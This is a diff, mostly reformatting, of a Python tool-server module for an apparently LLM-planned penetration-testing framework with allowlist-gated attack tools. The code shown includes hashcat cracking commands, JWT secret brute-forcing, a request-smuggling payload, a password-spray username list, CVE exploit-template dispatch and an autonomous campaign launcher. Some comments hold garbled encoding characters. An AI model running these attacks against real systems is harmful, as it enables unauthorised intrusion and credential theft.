@@ -42,13 +42,17 @@ def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
 
     # Kerberos TGS: $krb5tgs$23$*... (etype 23 RC4) / $krb5tgs$18$*... (etype 18 AES)
     if h.startswith("$krb5tgs$18$"):
-        identifications.append(("Kerberos 5 TGS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
+        identifications.append(
+            ("Kerberos 5 TGS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt")
+        )
     elif h.startswith("$krb5tgs$"):
         identifications.append(("Kerberos 5 TGS-REP", "13100", f"hashcat -m 13100 -a 0 '{h}' rockyou.txt"))
 
     # Kerberos AS-REP: $krb5asrep$23$*... (etype 23) / $krb5asrep$18$*... (etype 18)
     if h.startswith("$krb5asrep$18$"):
-        identifications.append(("Kerberos 5 AS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt"))
+        identifications.append(
+            ("Kerberos 5 AS-REP etype 18 (AES256)", "19900", f"hashcat -m 19900 -a 0 '{h}' rockyou.txt")
+        )
     elif h.startswith("$krb5asrep$"):
         identifications.append(("Kerberos 5 AS-REP", "18200", f"hashcat -m 18200 -a 0 '{h}' rockyou.txt"))
 
@@ -110,11 +114,15 @@ def _identify_hash_modes(h: str) -> list[tuple[str, str, str]]:
 
     # PDF: $pdf$...
     if h.startswith("$pdf$"):
-        identifications.append(("PDF", "10400", f"hashcat -m 10400 -a 0 '{h}' rockyou.txt  # 10600/10700 for newer revisions"))
+        identifications.append(
+            ("PDF", "10400", f"hashcat -m 10400 -a 0 '{h}' rockyou.txt  # 10600/10700 for newer revisions")
+        )
 
     # MS Office: $office$...
     if h.startswith("$office$"):
-        identifications.append(("MS Office", "9400", f"hashcat -m 9400 -a 0 '{h}' rockyou.txt  # 9500/9600 for 2010/2013"))
+        identifications.append(
+            ("MS Office", "9400", f"hashcat -m 9400 -a 0 '{h}' rockyou.txt  # 9500/9600 for 2010/2013")
+        )
 
     # WPA-PBKDF2 (possible): 64-hex:SSID
     if ":" in h and len(h.split(":")[0]) == 64 and len(h.split(":")[1]) <= 32:
@@ -154,13 +162,23 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         token = jwt_token.strip() if jwt_token else ""
         if not token:
             import socket as _sock
+
             # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
             for path in [
-                "/api/auth/login", "/login", "/auth", "/api/token",
-                "/api/v1/login", "/signin", "/oauth/token", "/api/me",
-                "/api/session", "/api/auth/token", "/api/access-token",
+                "/api/auth/login",
+                "/login",
+                "/auth",
+                "/api/token",
+                "/api/v1/login",
+                "/signin",
+                "/oauth/token",
+                "/api/me",
+                "/api/session",
+                "/api/auth/token",
+                "/api/access-token",
                 "/auth/realms/master/protocol/openid-connect/token",
-                "/wp-json/jwt-auth/v1/token", "/.well-known/openid-configuration",
+                "/wp-json/jwt-auth/v1/token",
+                "/.well-known/openid-configuration",
             ]:
                 try:
                     with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
@@ -217,20 +235,51 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
             hash_name = alg.replace("HS", "sha")
             # Phase 4: expanded weak-secret list (rockyou-top / jwt-secrets style)
             secrets = [
-                "secret", "key", "jwt_secret", "private_key", "changeme", "password",
-                "123456", "admin", "secret_key", "jwt-secret", "token", "auth",
-                "supersecret", "qwerty", "letmein", "welcome", "administrator",
-                "api_secret", "flask-secret", "django-insecure-", "node", "nodejs",
-                "express", "nextauth", "supabase", "firebase", "prod", "staging",
-                "dev", "test", "12345678", "password123", "secret123", "changethis",
+                "secret",
+                "key",
+                "jwt_secret",
+                "private_key",
+                "changeme",
+                "password",
+                "123456",
+                "admin",
+                "secret_key",
+                "jwt-secret",
+                "token",
+                "auth",
+                "supersecret",
+                "qwerty",
+                "letmein",
+                "welcome",
+                "administrator",
+                "api_secret",
+                "flask-secret",
+                "django-insecure-",
+                "node",
+                "nodejs",
+                "express",
+                "nextauth",
+                "supabase",
+                "firebase",
+                "prod",
+                "staging",
+                "dev",
+                "test",
+                "12345678",
+                "password123",
+                "secret123",
+                "changethis",
             ]
             found_secrets = []
             for secret in secrets:
                 try:
-                    sig = _b64url_encode(_hmac.new(
-                        secret.encode(), f"{parts[0]}.{parts[1]}".encode(),
-                        getattr(_hashlib, hash_name, _hashlib.sha256)
-                    ).digest())
+                    sig = _b64url_encode(
+                        _hmac.new(
+                            secret.encode(),
+                            f"{parts[0]}.{parts[1]}".encode(),
+                            getattr(_hashlib, hash_name, _hashlib.sha256),
+                        ).digest()
+                    )
                     if sig == parts[2]:
                         found_secrets.append(secret)
                 except Exception:
@@ -246,7 +295,9 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if alg.startswith("RS"):
             result_lines.append("")
             result_lines.append("--- HMAC-to-RSA key confusion ---")
-            result_lines.append("If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret.")
+            result_lines.append(
+                "If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret."
+            )
 
         return "\n".join(result_lines)
 
@@ -277,16 +328,46 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ]
 
         endpoints = [
-            "/", "/search", "/profile", "/user", "/page", "/render", "/preview",
+            "/",
+            "/search",
+            "/profile",
+            "/user",
+            "/page",
+            "/render",
+            "/preview",
             # Phase 4: template-render-heavy endpoints
-            "/api/render", "/template", "/message", "/comment", "/email/preview",
-            "/format", "/eval", "/compile", "/v1/render", "/admin/template",
+            "/api/render",
+            "/template",
+            "/message",
+            "/comment",
+            "/email/preview",
+            "/format",
+            "/eval",
+            "/compile",
+            "/v1/render",
+            "/admin/template",
         ]
         params = [
-            "q", "search", "name", "username", "id", "page", "input", "data",
+            "q",
+            "search",
+            "name",
+            "username",
+            "id",
+            "page",
+            "input",
+            "data",
             # Phase 4: template/body params
-            "template", "body", "content", "message", "text", "html",
-            "subject", "recipient", "to", "from", "title",
+            "template",
+            "body",
+            "content",
+            "message",
+            "text",
+            "html",
+            "subject",
+            "recipient",
+            "to",
+            "from",
+            "title",
         ]
 
         found_engine = None
@@ -332,15 +413,29 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
         result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {target_ip}:{port}", ""]
 
-        intro_query = json.dumps({"query": """
+        intro_query = json.dumps(
+            {
+                "query": """
             query { __schema { queryType { name } mutationType { name } types { name kind description fields { name } } } }
-        """})
+        """
+            }
+        )
 
         endpoints = [
-            "/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query",
+            "/graphql",
+            "/gql",
+            "/api/graphql",
+            "/v1/graphql",
+            "/query",
             # Phase 4: expanded GraphQL surface
-            "/api/v1/graphql", "/public/graphql", "/graphql/schema",
-            "/api/schema", "/__graphql", "/api", "/graphql/batch", "/g",
+            "/api/v1/graphql",
+            "/public/graphql",
+            "/graphql/schema",
+            "/api/schema",
+            "/__graphql",
+            "/api",
+            "/graphql/batch",
+            "/g",
         ]
         found = None
 
@@ -381,13 +476,15 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if found:
             result_lines.append("")
             result_lines.append("--- Batching attack test ---")
-            batch_body = json.dumps([
-                {"query": "{ __typename }"},
-                {"query": "{ __typename }"},
-                {"query": "{ __typename }"},
-                {"query": "{ __typename }"},
-                {"query": "{ __typename }"},
-            ]).encode()
+            batch_body = json.dumps(
+                [
+                    {"query": "{ __typename }"},
+                    {"query": "{ __typename }"},
+                    {"query": "{ __typename }"},
+                    {"query": "{ __typename }"},
+                    {"query": "{ __typename }"},
+                ]
+            ).encode()
             try:
                 s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                 s.settimeout(8)
@@ -580,23 +677,14 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 return f"ERROR: {e}".encode()
 
         # Baseline
-        baseline = _send_raw(
-            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n".encode()
-        )
+        baseline = _send_raw(f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n".encode())
         result_lines.append(f"Baseline: {len(baseline)} bytes")
 
         # CL.TE test
         result_lines.append("")
         result_lines.append("--- CL.TE test ---")
         cl_te = (
-            f"POST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
-            f"Content-Length: 6\r\n"
-            f"Transfer-Encoding: chunked\r\n"
-            f"\r\n"
-            f"0\r\n"
-            f"\r\n"
-            f"G"
+            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
         ).encode()
         resp = _send_raw(cl_te)
         result_lines.append(f"Response: {len(resp)} bytes")
@@ -664,16 +752,54 @@ def register_attack_module_tools(mcp: Any, *, ctx: ToolContext) -> None:
         result_lines = [f"PASSWORD_SPRAY_RESULTS: {target_ip}:{port}", f"Password: {password}", ""]
 
         users = [
-            "admin", "administrator", "root", "user", "test", "guest",
-            "info", "support", "sales", "marketing", "hr", "finance",
-            "manager", "developer", "dev", "ops", "backup", "service",
+            "admin",
+            "administrator",
+            "root",
+            "user",
+            "test",
+            "guest",
+            "info",
+            "support",
+            "sales",
+            "marketing",
+            "hr",
+            "finance",
+            "manager",
+            "developer",
+            "dev",
+            "ops",
+            "backup",
+            "service",
             # Phase 4: service accounts, cloud defaults, app defaults
-            "sql", "oracle", "sa", "postgres", "redis", "mongo",
-            "cassandra", "elastic", "kibana", "jenkins", "gitlab", "grafana",
-            "jira", "confluence", "svc_account", "svc_web", "svc_db",
-            "ec2-user", "ssm-user", "centos", "fedora", "ubuntu",
-            "sysadmin", "operator", "audit", "security", "readonly",
-            "reports", "backup_admin",
+            "sql",
+            "oracle",
+            "sa",
+            "postgres",
+            "redis",
+            "mongo",
+            "cassandra",
+            "elastic",
+            "kibana",
+            "jenkins",
+            "gitlab",
+            "grafana",
+            "jira",
+            "confluence",
+            "svc_account",
+            "svc_web",
+            "svc_db",
+            "ec2-user",
+            "ssm-user",
+            "centos",
+            "fedora",
+            "ubuntu",
+            "sysadmin",
+            "operator",
+            "audit",
+            "security",
+            "readonly",
+            "reports",
+            "backup_admin",
         ]
 
         found = []
@@ -1472,13 +1598,29 @@ if __name__ == "__main__":
 
         # Determine port/protocol hint from service name.
         port_hint = {
-            "http": 80, "https": 443, "smb": 445, "rdp": 3389,
-            "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306,
-            "mssql": 1433, "ldap": 389, "rdp2": 3389, "rdp3": 3389,
+            "http": 80,
+            "https": 443,
+            "smb": 445,
+            "rdp": 3389,
+            "ssh": 22,
+            "ftp": 21,
+            "smtp": 25,
+            "mysql": 3306,
+            "mssql": 1433,
+            "ldap": 389,
+            "rdp2": 3389,
+            "rdp3": 3389,
             # Phase 4: new CVE-family service ports
-            "activemq": 61616, "confluence": 8090, "ivanti": 443,
-            "panos": 443, "citrix": 443, "connectwise": 80,
-            "jenkins": 8080, "joomla": 80, "php_cgi": 80, "commons_text": 80,
+            "activemq": 61616,
+            "confluence": 8090,
+            "ivanti": 443,
+            "panos": 443,
+            "citrix": 443,
+            "connectwise": 80,
+            "jenkins": 8080,
+            "joomla": 80,
+            "php_cgi": 80,
+            "commons_text": 80,
         }.get(svc.lower(), 80)
 
         # CVE-family-specific template. Keep the surface small but
@@ -1527,14 +1669,22 @@ if __name__ == "__main__":
         # Phase 4: log which dispatch branch fired so the agent can debug
         # "why did I get the generic probe for CVE-2024-6387".
         _dispatch_name = {
-            _render_log4j_exploit: "log4j", _render_eternalblue_template: "eternalblue",
-            _render_smbghost_template: "smbghost", _render_bluekeep_template: "bluekeep",
-            _render_regresshion_template: "regresshion", _render_xz_backdoor_template: "xz_backdoor",
-            _render_activemq_rce_template: "activemq", _render_confluence_template: "confluence",
-            _render_ivanti_template: "ivanti", _render_panos_template: "panos",
-            _render_citrix_template: "citrix", _render_connectwise_template: "connectwise",
-            _render_jenkins_template: "jenkins", _render_joomla_template: "joomla",
-            _render_text4shell_template: "text4shell", _render_php_cgi_template: "php_cgi",
+            _render_log4j_exploit: "log4j",
+            _render_eternalblue_template: "eternalblue",
+            _render_smbghost_template: "smbghost",
+            _render_bluekeep_template: "bluekeep",
+            _render_regresshion_template: "regresshion",
+            _render_xz_backdoor_template: "xz_backdoor",
+            _render_activemq_rce_template: "activemq",
+            _render_confluence_template: "confluence",
+            _render_ivanti_template: "ivanti",
+            _render_panos_template: "panos",
+            _render_citrix_template: "citrix",
+            _render_connectwise_template: "connectwise",
+            _render_jenkins_template: "jenkins",
+            _render_joomla_template: "joomla",
+            _render_text4shell_template: "text4shell",
+            _render_php_cgi_template: "php_cgi",
             _render_http2_rapid_reset_template: "http2_rapid_reset",
         }.get(_renderer, "generic")
         result_lines.append(f"TEMPLATE_DISPATCHED: {_dispatch_name}")
@@ -1551,6 +1701,7 @@ if __name__ == "__main__":
         # first-pass inline check).
         try:
             from tools.poc_verifier import poc_verification_config, syntax_check
+
             pv_cfg = poc_verification_config(config)
             if pv_cfg["enabled"]:
                 syn = syntax_check(exploit_body)
@@ -1616,7 +1767,6 @@ if __name__ == "__main__":
     # Post-Exploitation & Lateral Movement
     # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-
     # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     # 2. Attack Planning & Strategy (tools.attack_planner)
     # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
@@ -1673,7 +1823,9 @@ if __name__ == "__main__":
                         model_name,
                         messages=[{"role": "user", "content": prompt}],
                     )
-                    content = response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
+                    content = (
+                        response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
+                    )
                     steps = parse_plan_json(content)
                     for step in steps:
                         plan.add_step(step)
@@ -1779,7 +1931,9 @@ if __name__ == "__main__":
                         model_name,
                         messages=[{"role": "user", "content": prompt}],
                     )
-                    content = response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
+                    content = (
+                        response.get("message", {}).get("content", "") if isinstance(response, dict) else str(response)
+                    )
                     action, step, explanation = parse_replan_json(content)
 
                     if action == "next_phase":
@@ -1878,7 +2032,9 @@ if __name__ == "__main__":
             cves: list[str] = []
 
             # Search for the most recent recon_result.json for this target
-            for attempt_dir in sorted(workspace.glob("*"), key=lambda p: p.stat().st_mtime if p.exists() else 0, reverse=True):
+            for attempt_dir in sorted(
+                workspace.glob("*"), key=lambda p: p.stat().st_mtime if p.exists() else 0, reverse=True
+            ):
                 recon_file = attempt_dir / "recon_result.json"
                 if recon_file.exists():
                     try:
@@ -1886,11 +2042,13 @@ if __name__ == "__main__":
                         if recon_data.get("target_ip") == target_ip:
                             target_os = recon_data.get("os_family")
                             for svc in recon_data.get("services", []):
-                                services.append({
-                                    "service": svc.get("service", ""),
-                                    "port": f"{svc.get('port', '')}/{svc.get('protocol', 'tcp')}",
-                                    "version": svc.get("version", ""),
-                                })
+                                services.append(
+                                    {
+                                        "service": svc.get("service", ""),
+                                        "port": f"{svc.get('port', '')}/{svc.get('protocol', 'tcp')}",
+                                        "version": svc.get("version", ""),
+                                    }
+                                )
                             # Extract CVEs from script results
                             for svc in recon_data.get("services", []):
                                 for script_id, output in svc.get("scripts", {}).items():
@@ -1969,8 +2127,7 @@ if __name__ == "__main__":
             creds = result.get("credentials_found") or result.get("credentials") or []
             if creds:
                 creds_str = "; ".join(
-                    c if isinstance(c, str) else " ".join(f"{k}={v}" for k, v in c.items())
-                    for c in creds
+                    c if isinstance(c, str) else " ".join(f"{k}={v}" for k, v in c.items()) for c in creds
                 )
                 lines.append(f"CREDENTIALS_FOUND: {creds_str}")
             if result.get("evidence"):
@@ -1992,7 +2149,9 @@ if __name__ == "__main__":
 
     @mcp.tool()
     @require_allowlist()
-    def craft_exploit(target_ip: str, service_name: str, version: str = "", os_hint: str = "", module_name: str = "") -> str:
+    def craft_exploit(
+        target_ip: str, service_name: str, version: str = "", os_hint: str = "", module_name: str = ""
+    ) -> str:
         """Generate a custom exploit script tailored to a specific target service.
 
         Uses the ExploitMutator with experience-aware PayloadCrafter to produce a
@@ -2236,7 +2395,9 @@ if __name__ == "__main__":
 
     @mcp.tool()
     @require_allowlist()
-    async def start_autonomous_campaign(target_ip: str, goal: str = "initial_access", aggression_level: str = "normal") -> str:
+    async def start_autonomous_campaign(
+        target_ip: str, goal: str = "initial_access", aggression_level: str = "normal"
+    ) -> str:
         """Start a fully autonomous attack campaign against a target IP.
 
         Launches the AutonomousOrchestrator in a background daemon thread. The orchestrator
@@ -2291,7 +2452,10 @@ if __name__ == "__main__":
                 "opsec": (config or {}).get("opsec", {}),
                 # Phase 3: pass the MSF auto-local_exploit_suggester flag through
                 # so the privesc phase can dispatch the advisory follow-up.
-                "msf_auto_les": (config or {}).get("exploit", {}).get("msf", {}).get("auto_local_exploit_suggester", False),
+                "msf_auto_les": (config or {})
+                .get("exploit", {})
+                .get("msf", {})
+                .get("auto_local_exploit_suggester", False),
                 # D1: pass the orchestrator.semantic_memory flag + ollama/embed
                 # config through so the orchestrator can build its own
                 # SemanticMemoryManager when no manager is supplied directly.
@@ -2344,9 +2508,7 @@ if __name__ == "__main__":
                 "compromised_hosts": [],
                 "last_error": "",
             }
-            (campaign_dir / "state.json").write_text(
-                json.dumps(initial_state, indent=2, default=str), encoding="utf-8"
-            )
+            (campaign_dir / "state.json").write_text(json.dumps(initial_state, indent=2, default=str), encoding="utf-8")
 
             # Launch in background asyncio task
             async def _run_campaign() -> None:
@@ -2367,7 +2529,9 @@ if __name__ == "__main__":
                         "completed_at": datetime.now(timezone.utc).isoformat(),
                         "current_phase": state.current_phase.value,
                         "tasks": {
-                            "completed": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.COMPLETED),
+                            "completed": sum(
+                                1 for t in orchestrator._tasks.values() if t.status == TaskStatus.COMPLETED
+                            ),
                             "failed": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.FAILED),
                             "pending": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.PENDING),
                         },
@@ -2519,11 +2683,7 @@ if __name__ == "__main__":
             # is logged as approved=False, status=blocked).
             allowed, reason = check_targets_allowlist([target_ip], config)
             if not allowed:
-                return (
-                    f"CAMPAIGN_STEP_RESULT: blocked\n"
-                    f"TARGET: {target_ip}\n"
-                    f"BLOCKED_REASON: {reason}"
-                )
+                return f"CAMPAIGN_STEP_RESULT: blocked\nTARGET: {target_ip}\nBLOCKED_REASON: {reason}"
 
             # Build orchestrator and load state. Merge the ``autonomous``
             # config block so the opt-in Phase 2 flags flow through; explicit
@@ -2537,7 +2697,10 @@ if __name__ == "__main__":
                 # disabled profile -> pacing no-op (legacy behavior).
                 "opsec": (config or {}).get("opsec", {}),
                 # Phase 3: pass the MSF auto-local_exploit_suggester flag through.
-                "msf_auto_les": (config or {}).get("exploit", {}).get("msf", {}).get("auto_local_exploit_suggester", False),
+                "msf_auto_les": (config or {})
+                .get("exploit", {})
+                .get("msf", {})
+                .get("auto_local_exploit_suggester", False),
                 # D1: pass the orchestrator.semantic_memory flag + ollama/embed
                 # config through so the orchestrator can build its own
                 # SemanticMemoryManager when no manager is supplied directly.
@@ -2603,6 +2766,7 @@ if __name__ == "__main__":
             )
 
             from tools.attack_modules import find_modules
+
             scored = find_modules(ctx)
             if not scored:
                 state_data["status"] = "completed"
@@ -2630,9 +2794,7 @@ if __name__ == "__main__":
 
             state_data["tasks"] = tasks
             state_data["current_phase"] = "exploit"
-            (campaign_dir / "state.json").write_text(
-                json.dumps(state_data, indent=2, default=str), encoding="utf-8"
-            )
+            (campaign_dir / "state.json").write_text(json.dumps(state_data, indent=2, default=str), encoding="utf-8")
 
             lines = [
                 "CAMPAIGN_STEP_RESULT: executed",
@@ -2685,6 +2847,3 @@ if __name__ == "__main__":
 
     # 6. Persistent Interactive Sessions (tools.persistent_session_manager)
     # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
-
-
-
